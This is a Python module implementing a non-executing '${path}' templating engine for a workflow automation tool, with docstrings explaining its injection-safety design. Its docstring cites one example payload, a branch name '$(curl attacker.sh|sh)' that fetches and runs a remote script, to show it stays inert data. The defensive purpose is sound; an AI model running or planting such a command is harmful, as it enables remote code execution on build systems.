"""Value-substitution templating (spec §2.6).

``${event.pr.title}`` yields the *string value* at that path. There is:
  * no expression evaluation,
  * no method invocation,
  * no arithmetic, no filters, no conditionals,
  * no shell interpolation.

The engine is chosen for having no executable semantics rather than for
expressiveness. A resolved value is always a Python scalar (or a JSON-serialisable
container) destined to be passed as an argv element or a typed API field — it is
never spliced into a command line or evaluated.

Because substitution produces *data*, injection payloads in T4 content (e.g. a
branch name of ``$(curl attacker.sh|sh)``) survive as inert strings: the ``$( )``
is copied verbatim into a value, never executed, and the only place it can go next
is an argv array element or an encoded API field.
"""

from __future__ import annotations

import re
from typing import Any

from wfa.shared.errors import WfaError

# A reference is exactly ``${ dotted.path }``. The path allows word chars, dots and
# array indices like ``steps.summarise.output.items.0``. Anything else (parentheses,
# pipes, backticks, operators) is NOT a valid reference and will never be treated as
# code — it is left untouched as literal text.
_REF = re.compile(r"\$\{\s*([A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z0-9_]+)*)\s*\}")


class TemplateError(WfaError):
    """A template referenced a path that does not resolve (fail-closed)."""


def _lookup(path: str, context: dict[str, Any]) -> Any:
    node: Any = context
    for part in path.split("."):
        if isinstance(node, dict):
            if part not in node:
                raise TemplateError(f"unresolved reference: ${{{path}}}")
            node = node[part]
        elif isinstance(node, (list, tuple)):
            try:
                idx = int(part)
            except ValueError as exc:
                raise TemplateError(f"non-index into list: ${{{path}}}") from exc
            if idx < 0 or idx >= len(node):
                raise TemplateError(f"index out of range: ${{{path}}}") from None
            node = node[idx]
        else:
            raise TemplateError(f"cannot descend into scalar at ${{{path}}}")
    return node


def substitute(template: Any, context: dict[str, Any]) -> Any:
    """Resolve references inside ``template`` against ``context``.

    * A string that is *exactly* one reference resolves to the underlying typed value
      (so ``${event.pr.number}`` can stay an int passed to a typed API field).
    * A string with a reference embedded in surrounding text resolves each reference
      to its ``str()`` and splices the value in as text (still just data).
    * dicts/lists are resolved recursively.
    * Non-string scalars pass through unchanged.
    """

    if isinstance(template, dict):
        return {k: substitute(v, context) for k, v in template.items()}
    if isinstance(template, list):
        return [substitute(v, context) for v in template]
    if not isinstance(template, str):
        return template

    exact = _REF.fullmatch(template.strip())
    if exact is not None:
        # Whole-string reference -> preserve the value's native type.
        return _lookup(exact.group(1), context)

    # Embedded references -> substitute each as text. The replacement is the *value*,
    # never re-parsed as a template, so a resolved value that itself looks like
    # ``${...}`` or ``$(...)`` is inert.
    def _repl(m: re.Match[str]) -> str:
        return str(_lookup(m.group(1), context))

    return _REF.sub(_repl, template)


def resolve_args(with_: dict[str, Any], context: dict[str, Any]) -> dict[str, Any]:
    """Resolve a step's ``with:`` block into concrete, typed argument values."""

    return {k: substitute(v, context) for k, v in with_.items()}
